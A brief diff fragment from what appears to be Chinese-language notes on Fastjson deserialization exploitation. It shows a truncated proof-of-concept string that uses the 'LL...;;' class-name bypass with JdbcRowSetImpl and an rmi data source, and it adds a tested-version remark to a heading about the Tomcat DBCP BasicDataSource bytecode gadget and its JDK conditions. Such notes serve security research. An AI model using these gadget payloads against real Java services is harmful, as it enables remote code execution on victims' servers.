@@ -44,7 +44,7 @@ String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rm
     <version>1.5.0</version>
 </dependency>
 ```
-## 3.org.apache.tomcat.dbcp.dbcp2.BasicDataSource
+## 3.org.apache.tomcat.dbcp.dbcp2.BasicDataSource(1.2.42poc尝试了)
 一个字节码的利用，但其无需目标额外开启选项，也不用连接外部服务器，利用条件更低
 受害者本地需要有下面依赖, 并且jdk版本小于8u251, 版本限制是因为过高bcel无法使用
 ```text
